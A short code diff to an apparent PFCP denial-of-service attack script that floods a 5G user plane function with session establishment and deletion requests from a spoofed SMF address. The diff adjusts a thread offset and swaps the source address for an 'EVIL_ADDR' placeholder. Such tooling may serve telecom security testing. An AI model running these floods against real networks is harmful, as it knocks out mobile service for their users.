@@ -543,7 +543,7 @@ class PFCPDosAttack:
         thread_offset = 0
         for i in range(num_threads):
             count = per_thread + (1 if i < remaining else 0)
-            t = threading.Thread(target=self.pfcp_session_establishment_flood_worker, args=(count, thread_offset))
+            t = threading.Thread(target=self.pfcp_session_establishment_flood_worker, args=(count, thread_offset +1))
             t.start()
             threads.append(t)
             thread_offset += count
@@ -637,6 +637,6 @@ class PFCPDosAttack:
 
 
 ### SESSION DELETION ATTACK (DoS)
-objet_dos = PFCPDosAttack(SPOOFED_SMF_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
+objet_dos = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
 objet_dos.set_verbose(True)
 objet_dos.Start_pfcp_session_deletion_flood(reqNbr=int(sys.argv[1]), num_threads=int(sys.argv[2]))
